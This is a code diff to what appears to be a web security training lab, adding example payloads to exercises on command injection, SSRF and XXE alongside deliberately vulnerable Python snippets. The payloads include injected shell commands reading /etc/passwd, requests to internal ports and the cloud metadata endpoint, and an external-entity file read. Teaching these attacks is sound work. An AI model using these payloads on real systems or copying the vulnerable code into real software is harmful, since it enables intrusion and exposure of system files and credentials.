@@ -113,6 +113,7 @@ const LabPage = () => {
       scenario:
         "An image processing app passes user input directly to system commands.",
       vulnerableCode: `import subprocess\n\nfilename = request.form['filename']\n# Dangerous! User input directly in shell command\nresult = subprocess.run(f"convert {filename} output.jpg", shell=True)`,
+      payload: `image.jpg; whoami`,
       hint1: "You can chain commands using ; or | in shell.",
       hint2: "Try: image.jpg; whoami to see who the process runs as.",
       hint3:
@@ -129,6 +130,7 @@ const LabPage = () => {
       scenario:
         "API endpoint downloads images from URLs. Access internal APIs.",
       vulnerableCode: `import requests\n\nurl = request.form['image_url']\n# No validation! User can specify any URL\nresponse = requests.get(url)\nprocess_image(response.content)`,
+      payload: `http://localhost:8080\nhttp://127.0.0.1:6379\nhttp://169.254.169.254/latest/meta-data`,
       hint1:
         "Try accessing internal URLs like http://localhost:8080 or http://127.0.0.1:6379",
       hint2:
@@ -147,6 +149,7 @@ const LabPage = () => {
       scenario:
         "An API accepts XML uploads for configuration. XXE allows file disclosure.",
       vulnerableCode: `from xml.etree import ElementTree as ET\n\nxml_data = request.data\n# Vulnerable XML parser - processes external entities!\nroot = ET.fromstring(xml_data)\nprocess_config(root)`,
+      payload: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>`,
       hint1: "Define a DOCTYPE with ENTITY pointing to a file.",
       hint2: 'Use SYSTEM keyword: <!ENTITY xxe SYSTEM "file:///etc/passwd">',
       hint3:
@@ -162,6 +165,7 @@ const LabPage = () => {
         "The application executes system commands. Inject commands to read files.",
       scenario: "A network utility pings servers by taking user input.",
       vulnerableCode: `import subprocess\n\nhost = request.form['host']\n# Vulnerable - directly concatenates user input\nresult = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True)\nreturn result.stdout`,
+      payload: `google.com; cat /etc/passwd\nor\ngoogle.com$(whoami)`,
       hint1: "Use command separators: ; | || && ` $() to chain commands",
       hint2: "Try: google.com; cat /etc/passwd",
       hint3: "Command substitution: google.com$(cat /etc/passwd)",
